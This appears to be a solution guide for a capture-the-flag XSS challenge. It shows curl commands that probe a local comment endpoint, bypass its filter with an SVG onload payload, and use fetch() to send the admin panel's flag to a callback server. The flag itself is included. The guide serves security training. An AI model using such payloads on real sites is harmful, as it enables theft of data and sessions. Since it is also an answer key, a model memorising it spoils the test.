# S7BEN-HARD-002: Comprehensive Testing Guide
## XSS with Input Sanitization Bypass

[Content truncated for brevity - Full testing guide would include detailed exploitation steps, payload variations, real-world context, and troubleshooting. File structure created.]

## Quick Exploitation Path

### Phase 1: Reconnaissance
```bash
# Test blacklist filtering
curl -X POST http://localhost:3000/comment \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","message":"<script>alert(1)</script>"}'
```

### Phase 2: SVG Bypass
```bash
# SVG with onload bypasses both filters
curl -X POST http://localhost:3000/comment \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker","message":"<svg onload=alert(1)>"}'
```

### Phase 3: Flag Exfiltration
```bash
# Payload to exfiltrate flag from admin panel
PAYLOAD='<svg onload=fetch("http://callback-server:8080/exfil?flag="+document.querySelector(".flag-display code").textContent)>'

curl -X POST http://localhost:3000/comment \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"exploit\",\"message\":\"$PAYLOAD\"}"

# Visit admin panel to trigger payload
curl http://localhost:3000/admin
```

## Success Indicators
- SVG payload appears in comments without sanitization
- Admin panel executes JavaScript from comment
- Callback server receives exfiltrated flag
- Flag visible: `S7BEN{xss_sanitizer_byp4ss_svg_onload_def456}`
